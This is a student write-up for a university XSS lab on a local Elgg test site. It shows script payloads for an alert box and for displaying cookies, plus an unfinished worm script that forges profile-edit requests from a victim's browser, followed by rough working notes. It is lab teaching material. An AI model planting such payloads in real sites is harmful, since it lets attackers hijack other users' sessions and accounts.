# CSUS CSC154: XSS Lab  

## Goal  
To fully demonstrate what attackers can do by exploiting XSS vulnerabilities.


## Lab Environment  
In this lab, we need three things, which are already installed in the provided `SEEDUbuntu12.04` VM image: (1) the Firefox web browser, (2) the Apache web server, and (3) the Elgg web application. For the browser, we need to use the LiveHTTPHeaders extension for Firefox to inspect the HTTP requests and responses. The pre-built Ubuntu VM image provided to you has already installed the Firefox web browser with the required extensions.  

The user accounts for Elgg are found below.  

| User          | UserName      | Password     |
| ------------- |:-------------:| ------------:|
| Admin         | admin         | seedelgg     |
| Alice         | alice         | seedalice    |
| Boby          | boby          | seedboby     |
| Charlie       | charlie       | seedcharlie  |
| Samy          | samy          | seedsamy     |



## Lab Tasks  

### Posting a Malicious Message to Display an Alert Window  
The objective of this task is to embed a JavaScript program in our Elgg profile, such that when another
user views our profile, the JavaScript program will be executed and an alert window will be displayed. The
following JavaScript program will display an alert window:  

```javascript
<script>alert('xss');</script>
```

To accomplish this, we simply login as Samy, and navigate to edit our profile. As can be seen in Figure 1 below, we've placed our JavaScript payload in the "Brief Descriptoin" portion of Samy's profile.  
![1_1_samy](./writeup/images/1_1_samy.png)  
**Figure 1:** JavaScript alert window payload to demonstrate XSS.  

![1_2_samy](./writeup/images/1_2_samy.png)  
**Figure 2:** JavaScript alert window fires when Samy's profile is visited.  


### Posting a Malicious Message to Display Cookies
The objective of this task is to embed a JavaScript program in our Elgg profile, such that when another user views our profile, the user's cookies will be displayed in the alert window. This can be done by adding some additional code to the JavaScript program in the previous task, more specifically `document.cookie` as such: 
```javascript
<script>alert(document.cookie);</script>
```

To accomplish this, we repeat the previous task, but replace the `'xss'` string, with `document.cookie`.  
![2_1_samy](./writeup/images/2_1_samy.png)  
**Figure 3:** JavaScript alert window payload to display user's cookie for the site.  

![2_2_samy](./writeup/images/2_2_samy.png)  
**Figure 4:** JavaScript alert window displays our Elgg cookie when visiting Samy's profile.




### Writing an XSS Worm  
In this and next task, we will perform an attack similar to what Samy did to MySpace in 2005 (i.e. the Samy Worm). First, we will write an XSS worm that does not self-propagate; in the next task, we will make it self-propagating. In this task, we need to write a malicious JavaScript program that forges HTTP requests directly from the victim's browser, without the intervention of the attacker. The objective of the attack is to modify the victim's profile and add Samy as a friend to the victim. 

To accomplish this we've developed the following JavaScript code.

```javascript
<script>
var Ajax=null;
// Construct the header information for the HTTP request
Ajax=new XMLHttpRequest();
Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Keep-Alive","300");
Ajax.setRequestHeader("Connection","keep-alive");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
// Construct the content. The format of the content can be learned
// from LiveHTTPHeaders.
var content="name=..&description=...&guid="; // You need to fill in the details.
// Send the HTTP POST request.
Ajax.send(content);
</script>
```



### Task 6: Writing a Self-Propagating XSS Worm  

### Task 7: Countermeasures  















Login as samy

email: samy
password: seedsamy

place xss code in profile

```html
<script>alert('xss');</script>
```


do the cookie thing



login as charlie and watch the http headers for adding someone as a friend.

do that shit in javascript and then embed the code in someone elses profile after it done.
